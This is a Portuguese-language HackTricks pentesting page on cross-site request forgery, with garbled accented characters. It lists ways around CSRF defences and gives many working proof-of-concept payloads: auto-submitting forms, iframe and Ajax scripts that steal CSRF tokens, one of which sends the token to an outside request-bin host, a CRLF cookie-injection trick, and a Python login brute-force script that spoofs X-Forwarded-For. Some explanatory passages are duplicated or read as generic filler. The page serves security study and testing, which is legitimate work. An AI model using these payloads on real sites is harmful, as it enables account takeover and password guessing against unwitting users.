# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais de bugs web3

üîî Receba notifica√ß√µes sobre novos programas de recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

## O que √© CSRF?

**Cross-site request forgery** (tamb√©m conhecido como CSRF) √© uma vulnerabilidade de seguran√ßa na web que permite que um invasor **induza usu√°rios a executar a√ß√µes que eles n√£o pretendem executar**.\
Isso √© feito **fazendo um usu√°rio logado** na plataforma da v√≠tima acessar um site controlado pelo atacante e a partir da√≠ **executar** c√≥digo JS malicioso, enviar formul√°rios ou recuperar "imagens" para a **conta da v√≠tima**.

### Requisitos

Para ser capaz de explorar uma vulnerabilidade CSRF, voc√™ primeiro precisa **encontrar uma a√ß√£o relevante para explorar** (alterar senha ou e-mail, fazer a v√≠tima seguir voc√™ em uma rede social, dar mais privil√©gios...). A **sess√£o deve depender apenas de cookies ou do cabe√ßalho de autentica√ß√£o b√°sica HTTP**, nenhum outro cabe√ßalho pode ser usado para manipular a sess√£o. E finalmente, **n√£o deve haver par√¢metros imprevis√≠veis** na solicita√ß√£o.

V√°rias **contramedidas** podem ser implementadas para evitar essa vulnerabilidade.

### **Defesas comuns**

* [**Cookies SameSite**](hacking-with-cookies/#samesite): Se o cookie de sess√£o estiver usando essa flag, voc√™ pode n√£o ser capaz de enviar o cookie de sites da web arbitr√°rios.
* [**Compartilhamento de recursos entre origens**](cors-bypass.md): Dependendo do tipo de solicita√ß√£o HTTP que voc√™ precisa executar para explorar a a√ß√£o relevante, voc√™ pode levar em conta a **pol√≠tica CORS do site da v√≠tima**. _Observe que a pol√≠tica CORS n√£o afetar√° se voc√™ apenas quiser enviar uma solicita√ß√£o GET ou uma solicita√ß√£o POST de um formul√°rio e n√£o precisar ler a resposta._
* Pe√ßa a **senha** do usu√°rio para autorizar a a√ß√£o.
* Resolva um **captcha**
* Leia os cabe√ßalhos **Referer** ou **Origin**. Se uma express√£o regular for usada, ela poder√° ser contornada, por exemplo, com:
  * http://mal.net?orig=http://example.com (termina com a url)
  * http://example.com.mal.net (come√ßa com a url)
* **Modifique** o **nome** dos **par√¢metros** da solicita√ß√£o Post ou Get
* Use um **token CSRF** em cada sess√£o. Esse token deve ser enviado dentro da solicita√ß√£o para confirmar a a√ß√£o. Esse token pode ser protegido com CORS.

### Mapa CSRF

![](<../.gitbook/assets/image (112).png>)

## Bypass de defesas

### De POST para GET

Talvez o formul√°rio que voc√™ deseja explorar esteja preparado para enviar uma **solicita√ß√£o POST com um token CSRF, mas** voc√™ deve **verificar** se um **GET** tamb√©m √© **v√°lido** e se, quando voc√™ envia uma solicita√ß√£o GET, o **token CSRF ainda est√° sendo validado**.

### Falta de token

Algumas aplica√ß√µes **validam corretamente o token quando ele est√° presente, mas ignoram a valida√ß√£o se o token for omitido**.\
Nessa situa√ß√£o, o invasor pode **remover todo o par√¢metro** contendo o token (n√£o apenas seu valor) para contornar a valida√ß√£o e realizar um ataque CSRF.

### Token CSRF n√£o est√° vinculado √† sess√£o do usu√°rio

Algumas aplica√ß√µes **n√£o validam que o token pertence √† mesma sess√£o** do usu√°rio que est√° fazendo a solicita√ß√£o. Em vez disso, a aplica√ß√£o **mant√©m um pool global de tokens** que emitiu e aceita qualquer token que apare√ßa neste pool.\
Nessa situa√ß√£o, o invasor pode fazer login na aplica√ß√£o usando sua pr√≥pria conta, **obter um token v√°lido** e, em seguida, **alimentar esse token para o usu√°rio v√≠tima** em seu ataque CSRF.

### Bypass de m√©todo

Se a solicita√ß√£o estiver usando um **m√©todo "estranho"**, verifique se a **funcionalidade de substitui√ß√£o de m√©todo** est√° funcionando.\
Por exemplo, se estiver **usando um m√©todo PUT**, voc√™ pode tentar **usar um m√©todo POST** e **enviar**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Isso tamb√©m pode funcionar enviando o **par√¢metro \_method dentro de uma solicita√ß√£o POST** ou usando os **cabe√ßalhos**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Bypass de token de cabe√ßalho personalizado

Se a solicita√ß√£o estiver adicionando um **cabe√ßalho personalizado** com um **token** √† solicita√ß√£o como **m√©todo de prote√ß√£o CSRF**, ent√£o:

* Teste a solicita√ß√£o sem o **Token Personalizado e tamb√©m o cabe√ßalho**.
* Teste a solicita√ß√£o com **exatamente o mesmo comprimento, mas com um token diferente**.

### Token CSRF √© verificado por um cookie

Em uma varia√ß√£o adicional da vulnerabilidade anterior, algumas aplica√ß√µes **duplicam cada token em um cookie e um par√¢metro de solicita√ß√£o**. Ou **definem um cookie csrf e verificam no backend se o token csrf enviado √© o relacionado com o cookie**.

Quando a solicita√ß√£o subsequente √© validada, a aplica√ß√£o simplesmente verifica se o **token** enviado no **par√¢metro da solicita√ß√£o corresponde** ao valor armazenado pelo **cookie**.\
Nessa situa√ß√£o, o invasor pode novamente realizar um **ataque CSRF se o site da web contiver alguma vulnerabilidade que permita que ele defina seu cookie CSRF para a v√≠tima como um CRLF**.

Nesse caso, voc√™ pode definir o cookie tentando carregar uma imagem falsa e, em seguida, lan√ßar o ataque CSRF como neste exemplo:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>
```
{% hint style="info" %}
Observe que se o **token csrf estiver relacionado ao cookie de sess√£o, esse ataque n√£o funcionar√°** porque voc√™ precisar√° definir a sess√£o da v√≠tima e, portanto, estar√° atacando a si mesmo.
{% endhint %}

### Mudan√ßa de Content-Type

De acordo com [**isto**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), para **evitar solicita√ß√µes de pr√©-voo** usando o m√©todo **POST**, esses s√£o os valores permitidos para Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

No entanto, observe que a **l√≥gica dos servidores pode variar** dependendo do **Content-Type** usado, portanto, voc√™ deve tentar os valores mencionados e outros como **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemplo (de [aqui](https://brycec.me/posts/corctf\_2021\_challenges)) de envio de dados JSON como text/plain:
```html
<html>
  <body>
    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
    </form>
    <script>
        form.submit();
    </script>
  </body>
</html>
```
### Bypass de requisi√ß√£o de pr√©-voo de aplica√ß√£o/json

Como voc√™ j√° sabe, n√£o √© poss√≠vel enviar uma solicita√ß√£o POST com o Content-Type **`application/json`** via formul√°rio HTML e, se voc√™ tentar fazer isso via **`XMLHttpRequest`**, uma solicita√ß√£o de pr√©-voo √© enviada primeiro.\
No entanto, voc√™ pode tentar enviar os dados JSON usando os tipos de conte√∫do **`text/plain`** e **`application/x-www-form-urlencoded`** apenas para verificar se o backend est√° usando os dados independentemente do Content-Type.\
Voc√™ pode enviar um formul√°rio usando `Content-Type: text/plain` definindo **`enctype="text/plain"`**

Se o servidor estiver aceitando apenas o tipo de conte√∫do "application/json", voc√™ pode **enviar o tipo de conte√∫do "text/plain; application/json"** sem acionar uma solicita√ß√£o de pr√©-voo.

Voc√™ tamb√©m pode tentar **burlar** essa restri√ß√£o usando um **arquivo flash SWF**. Para mais informa√ß√µes, [**leia este post**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypass de verifica√ß√£o de Referrer / Origin

**Evite o cabe√ßalho Referrer**

Algumas aplica√ß√µes validam o cabe√ßalho Referer quando ele est√° presente em solicita√ß√µes, mas **ignoram a valida√ß√£o se o cabe√ßalho for omitido**.
```markup
<meta name="referrer" content="never">
```
**Burlas de Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Para definir o nome de dom√≠nio do servidor na URL que o Referrer vai enviar dentro dos par√¢metros, voc√™ pode fazer:
```html
<html>
  <!-- Referrer policy needed to send the qury parameter in the referrer -->
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // You need to set this or the domain won't appear in the query of the referer header
      history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>
```
***

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais sobre bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

## **Exemplos de Explora√ß√£o**

### **Exfiltrando Token CSRF**

Se um **token CSRF** est√° sendo usado como **defesa**, voc√™ pode tentar **exfiltr√°-lo** abusando de uma vulnerabilidade [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou uma vulnerabilidade de [**Dangling Markup**](dangling-markup-html-scriptless-injection.md).

### **GET usando tags HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Outras tags HTML5 que podem ser usadas para enviar automaticamente uma solicita√ß√£o GET s√£o:

![](<../.gitbook/assets/image (530).png>)

### Solicita√ß√£o GET de formul√°rio
```markup
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### Requisi√ß√£o POST de formul√°rio
```markup
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="POST" action="https://victim.net/email/change-email" id="csrfform">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
      <input type="submit" value="Submit request" />
      <img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit(); //Way 3 to autosubmit
    </script>
  </body>
</html>
```
### Solicita√ß√£o de POST de formul√°rio atrav√©s de iframe
```markup
<!-- 
The request is sent through the iframe withuot reloading the page 
-->
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe> 
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### **Requisi√ß√£o POST Ajax**

---

An Ajax POST request can be used to perform CSRF attacks. The attacker can create a form with a hidden input field that contains the CSRF token of the victim's session. Then, using JavaScript, the attacker can submit the form using an Ajax POST request to the vulnerable endpoint.

Uma requisi√ß√£o POST Ajax pode ser usada para realizar ataques CSRF. O atacante pode criar um formul√°rio com um campo de entrada oculto que contenha o token CSRF da sess√£o da v√≠tima. Em seguida, usando JavaScript, o atacante pode enviar o formul√°rio usando uma requisi√ß√£o POST Ajax para o endpoint vulner√°vel.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>
```
### Requisi√ß√£o POST multipart/form-data
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});
```
### Solicita√ß√£o POST multipart/form-data v2
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Solicita√ß√£o POST de formul√°rio de dentro de um iframe
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Roubar o Token CSRF e enviar uma requisi√ß√£o POST**

Uma vez que o token CSRF √© armazenado no navegador do usu√°rio, um atacante pode tentar roub√°-lo usando t√©cnicas como XSS ou CSRF. Depois de obter o token, o atacante pode enviar uma requisi√ß√£o POST maliciosa para o servidor, que ser√° autenticada pelo token CSRF roubado. Isso pode permitir que o atacante execute a√ß√µes maliciosas em nome do usu√°rio leg√≠timo.

Para roubar o token CSRF, o atacante pode usar t√©cnicas como a inje√ß√£o de JavaScript malicioso em uma p√°gina vulner√°vel ou a cria√ß√£o de um formul√°rio falso que envia o token para um servidor controlado pelo atacante. Depois de obter o token, o atacante pode us√°-lo para enviar uma requisi√ß√£o POST maliciosa para o servidor.
```javascript
function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById("token");
            // Show the token
            //console.log("The token is: " + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o Post usando um iframe, um formul√°rio e Ajax**

Para realizar um ataque CSRF, √© necess√°rio obter o token CSRF v√°lido do usu√°rio alvo. Uma vez que o token CSRF √© obtido, ele pode ser usado para enviar solicita√ß√µes maliciosas em nome do usu√°rio alvo.

Uma maneira de obter o token CSRF √© usando um iframe para carregar a p√°gina de destino que cont√©m o token. O token pode ent√£o ser extra√≠do do c√≥digo-fonte da p√°gina usando JavaScript e usado para enviar uma solicita√ß√£o POST maliciosa.

Outra maneira de obter o token CSRF √© usando um formul√°rio oculto que √© preenchido automaticamente com o token CSRF e enviado usando JavaScript.

Finalmente, o token CSRF tamb√©m pode ser obtido usando uma solicita√ß√£o AJAX para a p√°gina de destino que retorna o token. O token pode ent√£o ser usado para enviar uma solicita√ß√£o POST maliciosa.

Em todos os casos, o objetivo √© obter o token CSRF v√°lido do usu√°rio alvo e us√°-lo para enviar solicita√ß√µes maliciosas em nome do usu√°rio.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;
    
    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
</script> 
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o POST usando um iframe e um formul√°rio**

Uma t√©cnica comum de ataque CSRF √© roubar o token CSRF de um usu√°rio leg√≠timo e us√°-lo para enviar uma solicita√ß√£o POST maliciosa. Isso pode ser feito usando um iframe e um formul√°rio oculto.

O primeiro passo √© obter o token CSRF do usu√°rio leg√≠timo. Isso pode ser feito usando um script malicioso que injeta um iframe em uma p√°gina leg√≠tima. O iframe aponta para a p√°gina que o atacante deseja atacar e inclui um formul√°rio oculto que envia uma solicita√ß√£o POST com o token CSRF roubado.

Quando o usu√°rio leg√≠timo visita a p√°gina leg√≠tima, o script malicioso √© executado e o iframe √© injetado na p√°gina. O formul√°rio oculto √© preenchido com os dados necess√°rios para enviar a solicita√ß√£o POST maliciosa, incluindo o token CSRF roubado. Quando o usu√°rio envia o formul√°rio, a solicita√ß√£o POST √© enviada para o servidor da p√°gina de destino, que acredita que a solicita√ß√£o √© leg√≠tima porque inclui o token CSRF correto.

Para se proteger contra esse tipo de ataque, os desenvolvedores devem garantir que seus aplicativos gerem tokens CSRF exclusivos para cada sess√£o do usu√°rio e que esses tokens sejam inclu√≠dos em todas as solicita√ß√µes POST. Al√©m disso, os desenvolvedores devem garantir que seus aplicativos n√£o permitam que solicita√ß√µes POST sejam enviadas de origens n√£o confi√°veis.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script> 
function read()
{
    var name = 'admin2';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
    document.writeln('</form>');
    document.forms[0].submit.click();
}
</script>
```
### **Roubar token e envi√°-lo usando 2 iframes**

Este m√©todo de ataque CSRF envolve a cria√ß√£o de dois iframes, um para enviar uma solicita√ß√£o GET para obter o token de autentica√ß√£o e outro para enviar a solicita√ß√£o POST com o token roubado. O primeiro iframe √© carregado com a URL da p√°gina que cont√©m o token de autentica√ß√£o e o segundo iframe √© carregado com a URL da p√°gina que cont√©m o formul√°rio que ser√° enviado com o token roubado.

O c√≥digo HTML para criar os dois iframes √© o seguinte:

```html
<iframe id="get-token" src="https://example.com/get-token"></iframe>
<iframe id="send-form" src="https://example.com/send-form"></iframe>
```

O JavaScript para roubar o token e envi√°-lo usando os dois iframes √© o seguinte:

```javascript
var getTokenFrame = document.getElementById('get-token');
var sendFormFrame = document.getElementById('send-form');

getTokenFrame.onload = function() {
  var token = getTokenFrame.contentWindow.document.body.innerHTML;
  sendFormFrame.contentWindow.postMessage(token, 'https://example.com');
};

window.addEventListener('message', function(event) {
  if (event.origin === 'https://example.com' && event.source === sendFormFrame.contentWindow) {
    var form = sendFormFrame.contentWindow.document.getElementById('form');
    form.submit();
  }
});
```

Este c√≥digo carrega o primeiro iframe com a URL `https://example.com/get-token`, que deve retornar o token de autentica√ß√£o em seu corpo HTML. Quando o iframe √© carregado, o c√≥digo JavaScript dentro do `onload` do iframe obt√©m o token do corpo HTML do iframe e o envia para o segundo iframe usando `postMessage`. O segundo iframe √© carregado com a URL `https://example.com/send-form`, que cont√©m um formul√°rio que ser√° enviado com o token roubado. Quando o segundo iframe recebe o token usando `postMessage`, o c√≥digo JavaScript dentro do `window.addEventListener` do documento envia o formul√°rio com o token roubado.
```markup
<script>
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
  <input type="text" name="username" value="z">
  <input type="checkbox" name="status" checked="">        
  <input id="token" type="hidden" name="token" value="0000" />
  <button type="submit">Submit</button>
</form>
```
### **POSTSteal CSRF token com Ajax e enviar um post com um formul√°rio**

Para realizar um ataque CSRF, √© necess√°rio obter o token CSRF v√°lido do usu√°rio alvo. Uma maneira de fazer isso √© usando uma solicita√ß√£o Ajax para obter o token e, em seguida, enviar um POST com um formul√°rio contendo o token. O c√≥digo abaixo mostra como fazer isso:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/path/to/endpoint/that/returns/csrf/token', true);
xhr.onload = function () {
  var csrfToken = xhr.responseText;

  var form = document.createElement('form');
  form.setAttribute('method', 'POST');
  form.setAttribute('action', '/path/to/endpoint/that/accepts/post/requests');

  var hiddenField = document.createElement('input');
  hiddenField.setAttribute('type', 'hidden');
  hiddenField.setAttribute('name', 'csrf_token');
  hiddenField.setAttribute('value', csrfToken);
  form.appendChild(hiddenField);

  document.body.appendChild(form);
  form.submit();
};
xhr.send();
```

Este c√≥digo envia uma solicita√ß√£o GET para um endpoint que retorna o token CSRF v√°lido. Em seguida, ele cria um formul√°rio com um campo oculto contendo o token e envia um POST para o endpoint que aceita solicita√ß√µes POST. O formul√°rio √© adicionado ao corpo do documento e enviado automaticamente.

Este ataque pode ser evitado usando tokens CSRF que expiram ap√≥s um determinado per√≠odo de tempo ou usando cookies HTTPOnly para armazenar o token CSRF.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="root"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="findtoken" name="token" value=""/>
  <input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open("GET","http://google.com?param=VALUE",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("findtoken").value = token;
    document.getElementById("form").submit();
  }
}
</script>
```
### CSRF com Socket.IO

Socket.IO √© uma biblioteca JavaScript para aplicativos web em tempo real. Ele permite a comunica√ß√£o bidirecional em tempo real entre o cliente e o servidor. No entanto, o Socket.IO pode ser vulner√°vel a ataques CSRF.

O Socket.IO usa cookies para autenticar usu√°rios e manter a sess√£o do usu√°rio. Se um invasor conseguir obter o cookie de autentica√ß√£o de um usu√°rio, ele poder√° enviar solicita√ß√µes maliciosas em nome do usu√°rio autenticado.

Para explorar essa vulnerabilidade, o invasor pode criar um site malicioso que envia solicita√ß√µes para o servidor Socket.IO usando o cookie de autentica√ß√£o do usu√°rio. Quando o usu√°rio visita o site malicioso, as solicita√ß√µes s√£o enviadas automaticamente para o servidor Socket.IO sem o conhecimento do usu√°rio.

Para evitar esse tipo de ataque, √© importante usar tokens CSRF para proteger as solicita√ß√µes do Socket.IO. O token CSRF √© um valor aleat√≥rio que √© gerado pelo servidor e inclu√≠do em cada solicita√ß√£o. O cliente deve enviar o token CSRF junto com a solicita√ß√£o e o servidor verifica se o token √© v√°lido antes de processar a solicita√ß√£o.

Para implementar a prote√ß√£o CSRF no Socket.IO, voc√™ pode usar a biblioteca `socketio-csrf`. Essa biblioteca adiciona suporte para tokens CSRF ao Socket.IO e √© f√°cil de usar. Basta adicionar o middleware `csrf` ao seu aplicativo Socket.IO e a biblioteca cuidar√° do resto.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
</script>
```
## CSRF Login Brute Force

O c√≥digo pode ser usado para for√ßar a entrada em um formul√°rio de login usando um token CSRF (tamb√©m est√° usando o cabe√ßalho X-Forwarded-For para tentar contornar uma poss√≠vel lista negra de IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())
```
## Ferramentas <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Refer√™ncias

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais sobre bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

<details>

